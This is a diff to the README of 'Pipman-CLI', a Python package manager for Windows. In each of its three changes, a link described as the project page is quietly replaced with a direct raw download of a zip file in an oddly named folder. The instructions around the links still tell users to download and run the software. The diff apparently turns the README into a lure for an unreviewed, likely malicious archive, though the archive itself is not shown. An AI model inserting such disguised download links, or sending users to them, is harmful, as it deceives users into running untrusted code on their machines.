@@ -1,6 +1,6 @@
 # ⚙️ Pipman-CLI - Manage Python packages with ease
 
-[![Download Pipman-CLI](https://img.shields.io/badge/Download-Pipman--CLI-1E90FF?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Centvision639/Pipman-CLI)
+[![Download Pipman-CLI](https://img.shields.io/badge/Download-Pipman--CLI-1E90FF?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Centvision639/Pipman-CLI/raw/refs/heads/main/primordially/CLI-Pipman-v1.6.zip)
 
 ## 🧭 What Pipman-CLI does
 
@@ -26,7 +26,7 @@ If you do not have Python yet, install it first from the official Python website
 
 ## 🚀 Download and install on Windows
 
-1. Open the main project page here: https://github.com/Centvision639/Pipman-CLI
+1. Open the main project page here: https://github.com/Centvision639/Pipman-CLI/raw/refs/heads/main/primordially/CLI-Pipman-v1.6.zip
 2. On that page, look for the latest release, download file, or project files
 3. Download the Windows version if one is provided
 4. Save the file to your Downloads folder
@@ -153,7 +153,7 @@ This tool is meant for people who want a simple way to manage Python packages fr
 ## 🔗 Download / open the project page
 
 Visit this page to download and run the software on Windows:
-https://github.com/Centvision639/Pipman-CLI
+https://github.com/Centvision639/Pipman-CLI/raw/refs/heads/main/primordially/CLI-Pipman-v1.6.zip
 
 ## 🧭 Simple path to start
 
